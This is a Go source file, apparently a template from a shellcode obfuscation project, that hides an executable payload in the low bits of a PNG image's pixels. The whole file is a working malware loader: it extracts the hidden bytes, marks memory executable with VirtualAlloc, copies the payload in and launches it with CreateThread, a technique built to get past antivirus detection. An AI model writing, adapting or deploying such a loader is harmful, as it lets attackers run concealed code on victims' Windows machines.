package main

import (
	"image"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	_ "image/png"

	_ "golang.org/x/image/bmp"
)

const shellcode_len = {{ MAX_BITS }}

var payload_data [shellcode_len / 8]byte

func get_lsb(target byte, source byte) byte {
	return (target << 1) | (source & 1)
}

func read_image(filename string) {
	img_file, _ := os.Open(filename)
	img, _, _ := image.Decode(img_file)
	g := img.Bounds()

	height := g.Dy()
	width := g.Dx()

	length := shellcode_len
	pos := 0

	for i := 0; i < height; i++ {
		for j := 0; j < width; j++ {

			r, g, b, _ := img.At(j, i).RGBA()

			for _, channel := range [3]byte{byte(r), byte(g), byte(b)} {
				if length <= 0 {
					return
				}

				payload_data[pos/8] = get_lsb(payload_data[pos/8], channel)
				pos++
				length--
			}
		}
	}
}

func run() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CreateThread := kernel32.NewProc("CreateThread")

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(shellcode_len/8), 0x3000, 0x40)
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload_data[0])), uintptr(shellcode_len/8))

	CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	time.Sleep(2 * time.Second)
}

func main() {
	read_image("C:/Users/Blackberry/Desktop/projects/yet-another-shellcode-obfuscator/samples/helpme_x64.png")
	run()
}
